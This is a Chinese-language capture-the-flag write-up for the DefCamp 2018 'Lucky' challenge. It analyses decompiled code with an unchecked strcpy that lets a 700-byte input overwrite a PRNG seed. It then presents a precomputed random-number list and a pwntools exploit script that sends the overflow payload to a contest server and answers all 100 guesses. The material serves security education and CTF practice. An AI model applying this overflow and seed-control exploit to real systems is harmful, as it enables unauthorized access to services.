---
title: Defcamp-CTF-Quals-2018 Lucky writeup
date: 2018-09-24 21:01:47
categories:
tags:
	- CTF
	- 栈溢出
---



[题目](lucky)



```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax@1
  unsigned int *v4; // rsi@2
  __int64 v5; // rax@4
  __int64 v6; // rax@6
  __int64 v7; // rax@7
  __int64 v8; // rax@7
  __int64 v9; // rax@7
  const char *v10; // rax@7
  __int64 v11; // rax@7
  __int64 v12; // rax@7
  __int64 v13; // rax@7
  __int64 v14; // rax@7
  __int64 v15; // rax@7
  __int64 v16; // rax@9
  __int64 v17; // rax@9
  __int64 v18; // rax@9
  __int64 v19; // rax@10
  __int64 v20; // rax@10
  __int64 v21; // rax@11
  signed int v22; // ebx@11
  __int64 v23; // rax@13
  char v25; // [sp+0h] [bp-540h]@12
  char v26; // [sp+210h] [bp-330h]@12
  char v27; // [sp+240h] [bp-300h]@7
  char dest; // [sp+260h] [bp-2E0h]@7
  char v29; // [sp+2D0h] [bp-270h]@7
  char v30; // [sp+2F0h] [bp-250h]@1
  __int64 v31; // [sp+3F0h] [bp-150h]@1
  unsigned int seed[2]; // [sp+4F8h] [bp-48h]@1
  int v33; // [sp+514h] [bp-2Ch]@9
  int v34; // [sp+518h] [bp-28h]@9
  unsigned int v35; // [sp+51Ch] [bp-24h]@7
  __int64 v36; // [sp+520h] [bp-20h]@1
  unsigned int i; // [sp+52Ch] [bp-14h]@7
 
  *(_QWORD *)seed = 0LL;
  v36 = 8LL;
  v3 = sub_1972(8LL, 4LL, a3);
  std::basic_ifstream<char,std::char_traits<char>>::basic_ifstream(&v30, "/dev/urandom", (unsigned int)v3);
  if ( (unsigned __int8)std::basic_ios<char,std::char_traits<char>>::operator bool(&v31) )
  {
    v4 = seed;
    std::istream::read((std::istream *)&v30, (char *)seed, v36);
    if ( (unsigned __int8)std::basic_ios<char,std::char_traits<char>>::operator bool(&v31) )
    {
      srand(seed[0]);
    }
    else
    {
      LODWORD(v5) = std::operator<<<std::char_traits<char>>(&std::cerr, "Failed to read from /dev/urandom");
      v4 = (unsigned int *)&std::endl<char,std::char_traits<char>>;
      std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
    }
    std::basic_ifstream<char,std::char_traits<char>>::close(&v30, v4);
  }
  else
  {
    LODWORD(v6) = std::operator<<<std::char_traits<char>>(&std::cerr, "Failed to open /dev/urandom");
    std::ostream::operator<<(v6, &std::endl<char,std::char_traits<char>>);
  }
  v35 = rand();
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v29);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v27);
  LODWORD(v7) = std::operator<<<std::char_traits<char>>(&std::cout, "Hello, there!");
  LODWORD(v8) = std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
  std::ostream::operator<<(v8, &std::endl<char,std::char_traits<char>>);
  LODWORD(v9) = std::operator<<<std::char_traits<char>>(&std::cout, "What is your name?");
  std::ostream::operator<<(v9, &std::endl<char,std::char_traits<char>>);
  std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, &v27);
  LODWORD(v10) = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(&v27);
  strcpy(&dest, v10);
  srand(v35);
  LODWORD(v11) = std::operator<<<std::char_traits<char>>(&std::cout, "I am glad to know you, ");
  LODWORD(v12) = std::operator<<<std::char_traits<char>>(v11, &dest);
  LODWORD(v13) = std::operator<<<std::char_traits<char>>(v12, "!");
  std::ostream::operator<<(v13, &std::endl<char,std::char_traits<char>>);
  LODWORD(v14) = std::operator<<<std::char_traits<char>>(
                   &std::cout,
                   "If you guess the next 100 random numbers I shall give you the flag!");
  LODWORD(v15) = std::ostream::operator<<(v14, &std::endl<char,std::char_traits<char>>);
  std::ostream::operator<<(v15, &std::endl<char,std::char_traits<char>>);
  for ( i = 0; (signed int)i <= 99; ++i )
  {
    v34 = rand();
    LODWORD(v16) = std::operator<<<std::char_traits<char>>(&std::cout, "What number am I thinking of? [");
    LODWORD(v17) = std::ostream::operator<<(v16, i);
    LODWORD(v18) = std::operator<<<std::char_traits<char>>(v17, "/100]");
    std::ostream::operator<<(v18, &std::endl<char,std::char_traits<char>>);
    std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, &v27);
    v33 = sub_1928(&v27, 0LL, 10LL);
    if ( v33 != v34 )
    {
      LODWORD(v21) = std::operator<<<std::char_traits<char>>(&std::cout, "Wow that is wrong!");
      std::ostream::operator<<(v21, &std::endl<char,std::char_traits<char>>);
      v22 = -1;
      goto LABEL_15;
    }
    LODWORD(v19) = std::operator<<<std::char_traits<char>>(&std::cout, "Wow that is corect!");
    LODWORD(v20) = std::ostream::operator<<(v19, &std::endl<char,std::char_traits<char>>);
    std::ostream::operator<<(v20, &std::endl<char,std::char_traits<char>>);
  }
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v26);
  std::basic_ifstream<char,std::char_traits<char>>::basic_ifstream(&v25, "./flag", 8LL);
  if ( (unsigned __int8)std::basic_ifstream<char,std::char_traits<char>>::is_open(&v25) )
  {
    std::getline<char,std::char_traits<char>,std::allocator<char>>(&v25, &v26);
    LODWORD(v23) = std::operator<<<char,std::char_traits<char>,std::allocator<char>>(&std::cout, &v26);
    std::ostream::operator<<(v23, &std::endl<char,std::char_traits<char>>);
    std::basic_ifstream<char,std::char_traits<char>>::close(&v25, &std::endl<char,std::char_traits<char>>);
  }
  v22 = 0;
  std::basic_ifstream<char,std::char_traits<char>>::~basic_ifstream(&v25);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v26);
LABEL_15:
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v27);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v29);
  std::basic_ifstream<char,std::char_traits<char>>::~basic_ifstream(&v30);
  return (unsigned int)v22;
}
```



它首先从*/ dev / urandom*读取种子值并生成随机数。它将此随机数存储在*v35中。*之后，它使用*std :: getline（std :: cin，＆v27）*读取用户输入。由于它是一个std :: string，它首先调用*c_str（）*函数来获取C字符串指针并将该指针存储在*v10中*。最后，它调用*strcpy（＆dest，v10）*将我们的字符串复制到*dest*。**没有长度检查**，这意味着我们可以使用缓冲区溢出覆盖其他变量。

在读取输入并将其复制到*dest后，* 它会调用*srand（v35）*。因此，第一个随机生成的数字实际上是进一步使用的种子值。最后，它使用*rand（）* 生成100个随机数，并期望我们正确猜测它们。

**我们可以看到，从*dest*到*v35*的距离是700字节，这意味着在700个字符之后，接下来的4个字符将覆盖作为种子的*v35*中的值。由于我们可以根据需要设置种子值，因此我们可以猜测将生成的数字。**



创建一个C程序，使用0xDEADBEEF作为种子值打印100个随机数。

```c
#include <stdio.h>
#include <stdlib.h>
 
int main() {
	int seed = 0xDEADBEEF;
	srand(seed);
	for (int i = 0; i < 100; i++) {
		printf("%d ", rand());
	}
	printf("\n");
	return 0;
}
```



编译运行就可以得到预期的随机数

```shell
$ gcc main.c -o random
$ ./random
352217057 918588210 499345174 513054021 248820349 2113718833 109687829 205975030 2049711996 1893967906 972265918 400263484 1638661130 1623839576 843216717 392334071 394727512 1880375820 1545420301 483026073 442577443 1978850083 980138184 1749530897 1465625129 1869833142 53208648 713656175 744035651 1790960585 3725086 1096252709 562065147 503070260 1609306730 810885496 469305445 1718994560 1016860526 371533793 1465478818 1989126444 771797277 956656301 1465482373 1615013995 1348990372 1860209885 1347906167 746927025 195752310 1790483610 578293461 1175890494 1392530859 2043918590 898239989 1445739507 610091118 1642275640 1089216444 613816204 591044701 1651281591 1116886464 52867784 314683439 1586191909 1771862344 1331543966 1957725703 1089857514 1173186762 582039332 2046513815 491185487 49569679 1248020540 203911724 1397475846 1994947565 399664035 1040475809 425757378 1575554529 285523020 322192321 326310870 1731262528 932283439 1968586511 672995324 1546099643 412147564 176793268 515502459 465015348 491476707 2101694368 89394044
```



EXP

```python
from pwn import * 
numbers = [352217057, 918588210, 499345174, 513054021, 248820349, 2113718833, 109687829, 205975030, 2049711996, 1893967906, 972265918, 400263484, 1638661130, 1623839576, 843216717, 392334071, 394727512, 1880375820, 1545420301, 483026073, 442577443, 1978850083, 980138184, 1749530897, 1465625129, 1869833142, 53208648, 713656175, 744035651, 1790960585, 3725086, 1096252709, 562065147, 503070260, 1609306730, 810885496, 469305445, 1718994560, 1016860526, 371533793, 1465478818, 1989126444, 771797277, 956656301, 1465482373, 1615013995, 1348990372, 1860209885, 1347906167, 746927025, 195752310, 1790483610, 578293461, 1175890494, 1392530859, 2043918590, 898239989, 1445739507, 610091118, 1642275640, 1089216444, 613816204, 591044701, 1651281591, 1116886464, 52867784, 314683439, 1586191909, 1771862344, 1331543966, 1957725703, 1089857514, 1173186762, 582039332, 2046513815, 491185487, 49569679, 1248020540, 203911724, 1397475846, 1994947565, 399664035, 1040475809, 425757378, 1575554529, 285523020, 322192321, 326310870, 1731262528, 932283439, 1968586511, 672995324, 1546099643, 412147564, 176793268, 515502459, 465015348, 491476707, 2101694368, 89394044]
 
r = remote('167.99.143.206', 65031)
r.recvlines(3)
r.sendline('A' * 700 + p32(0xDEADBEEF))
r.recvlines(3)
 
for number in numbers:
    r.recvline()
    r.sendline(str(number))
    r.recvlines(2)
    
print r.recv()
```



## 参考

https://www.pwndiary.com/write-ups/defcamp-ctf-quals-2018-lucky-write-up-pwn50/

https://ctftime.org/writeup/11396